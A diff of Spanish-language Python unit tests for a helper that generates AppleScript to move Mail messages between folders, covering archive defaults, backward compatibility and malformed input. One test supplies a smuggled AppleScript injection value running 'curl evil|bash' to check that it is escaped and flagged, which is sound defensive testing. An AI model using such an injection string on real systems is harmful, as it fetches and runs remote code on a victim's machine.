@@ -1375,6 +1375,129 @@ class TestMontarMoverV389(unittest.TestCase):
         self.assertFalse(out["ok"])
 
 
+class TestMontarMoverContratoCompletoCM1(unittest.TestCase):
+    """CM1 (auditoria 2026-07-19, F1/F4/F26): montar-mover cierra el contrato de
+    los TRES destinos. destino_archive vacío = archivo nativo (buzón "Archive");
+    reply_needed opcional que se mueve solo si su carpeta difiere del origen.
+    Retrocompatible con el payload previo; TOTAL ante basura en los campos nuevos."""
+
+    def _base(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX", "destino_review": "Revisar"}
+        d.update(kw)
+        return d
+
+    # --- F1: archivo nativo con destino_archive vacío ---
+    def test_archivo_nativo_con_destino_archive_vacio(self):
+        out = th.cmd_montar_mover(self._base(destino_archive="",
+                                             mids_archive=["b@y.com"]))
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["archivo_nativo"])
+        self.assertIn('set arcBox to mailbox "Archive" of acct', out["script"])
+        self.assertIn("b@y.com", out["script"])          # sí se emite al literal
+        # el matiz de localización/IMAP queda documentado en el propio script
+        self.assertIn("localización/IMAP", out["script"])
+
+    def test_archivo_nativo_si_destino_archive_ausente(self):
+        out = th.cmd_montar_mover(self._base(mids_archive=["b@y.com"]))
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["archivo_nativo"])
+        self.assertIn('mailbox "Archive" of acct', out["script"])
+
+    def test_destino_archive_definido_no_es_nativo(self):
+        out = th.cmd_montar_mover(self._base(destino_archive="Archivo",
+                                             mids_archive=["b@y.com"]))
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["archivo_nativo"])
+        self.assertIn('set arcBox to mailbox "Archivo" of acct', out["script"])
+        self.assertNotIn('mailbox "Archive" of acct', out["script"])
+
+    # --- reply_needed que SE QUEDA (no se mueve) ---
+    def test_reply_needed_se_queda_si_destino_vacio(self):
+        out = th.cmd_montar_mover(self._base(mids_reply_needed=["r@z.com"]))
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["reply_needed_movido"])
+        self.assertNotIn("r@z.com", out["script"])
+        self.assertNotIn("set toReply", out["script"])
+        self.assertNotIn("rnBox", out["script"])
+        self.assertNotIn("movidos_reply", out["script"])
+
+    def test_reply_needed_se_queda_si_destino_igual_origen(self):
+        out = th.cmd_montar_mover(self._base(destino_reply_needed="INBOX",
+                                             mids_reply_needed=["r@z.com"]))
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["reply_needed_movido"])
+        self.assertNotIn("r@z.com", out["script"])
+
+    # --- reply_needed que SE MUEVE (carpeta distinta del origen) ---
+    def test_reply_needed_se_mueve_a_carpeta_distinta(self):
+        out = th.cmd_montar_mover(self._base(destino_reply_needed="Responder",
+                                             mids_reply_needed=["r@z.com"]))
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["reply_needed_movido"])
+        self.assertEqual(out["n_reply_needed"], 1)
+        self.assertIn('set rnBox to mailbox "Responder" of acct', out["script"])
+        self.assertIn('set toReply to {"r@z.com"}', out["script"])
+        # QW2 también para reply: reporta fallidos por message-id, no solo conteo
+        for frag in ("set failRep to {}",
+                     "if not moved then set end of failRep to (theID as string)",
+                     "movidos_reply:", "fallidos_reply:["):
+            self.assertIn(frag, out["script"])
+
+    def test_reply_hostil_se_escapa_y_marca_sospechoso(self):
+        hostil = 'evil") do shell script "curl evil|bash'
+        out = th.cmd_montar_mover(self._base(destino_reply_needed="Responder",
+                                             mids_reply_needed=[hostil]))
+        self.assertTrue(out["ok"])
+        self.assertIn('\\"', out["script"])
+        for ln in out["script"].splitlines():
+            self.assertFalse(ln.strip().startswith("do shell script"))
+        self.assertTrue(any(s["lista"] == "mids_reply_needed"
+                            for s in out["sospechosos"]))
+
+    def test_reply_que_se_queda_no_reporta_sospechosos(self):
+        # si no se mueve, su contenido nunca llega a AppleScript: no es vector
+        hostil = 'evil") do shell script "x'
+        out = th.cmd_montar_mover(self._base(mids_reply_needed=[hostil]))
+        self.assertTrue(out["ok"])
+        self.assertFalse(any(s["lista"] == "mids_reply_needed"
+                             for s in out["sospechosos"]))
+
+    # --- retrocompatibilidad del payload viejo ---
+    def test_retrocompat_payload_viejo(self):
+        viejo = {"cuenta": "iCloud", "origen": "INBOX",
+                 "destino_review": "Revisar", "destino_archive": "Archivo",
+                 "mids_review": ["a@x.com"], "mids_archive": ["b@y.com"]}
+        out = th.cmd_montar_mover(viejo)
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["archivo_nativo"])
+        self.assertFalse(out["reply_needed_movido"])
+        self.assertEqual(out["n_reply_needed"], 0)
+        self.assertIn('mailbox "Archivo" of acct', out["script"])
+        # las claves originales del contrato de salida siguen presentes
+        for k in ("ok", "script", "sospechosos", "n_review", "n_archive"):
+            self.assertIn(k, out)
+
+    def test_destino_review_sigue_obligatorio(self):
+        out = th.cmd_montar_mover(self._base(destino_review=""))
+        self.assertFalse(out["ok"])
+        self.assertIn("destino_review", out["error"])
+
+    # --- totalidad ante basura en los campos nuevos ---
+    def test_totalidad_campos_nuevos_basura(self):
+        casos = [
+            self._base(destino_reply_needed={"x": 1}),
+            self._base(destino_archive=[1, 2]),
+            self._base(destino_reply_needed="R", mids_reply_needed="nolista"),
+            self._base(destino_reply_needed="R", mids_reply_needed=[{"a": 1}]),
+            self._base(destino_archive=3.14),
+            self._base(mids_reply_needed=[None, True]),
+        ]
+        for c in casos:
+            out = th.cmd_montar_mover(c)
+            self.assertIsInstance(out, dict)
+            self.assertIn("ok", out)
+            json.dumps(out, ensure_ascii=False)          # siempre serializable
+
 
 class TestBlindajeScoringEntradaQW1(unittest.TestCase):
     """Auditoría 2026-07-10 (QW1/F1): entradas imperfectas en la ruta de
@@ -1578,6 +1701,7 @@ _FUZZ_CLAVES = (
     "verdicts", "hard_rules", "extra_points", "emails", "id", "tier_maximo",
     "forzar_reply_needed", "remitente_en_historial", "cuenta", "origen",
     "destino_review", "destino_archive", "mids_review", "mids_archive",
+    "mids_reply_needed", "destino_reply_needed",
     "scoring", "criterios_epistemicos", "tiers", "ejes", "_basura_",
 )
 _FUZZ_ESCALARES = (
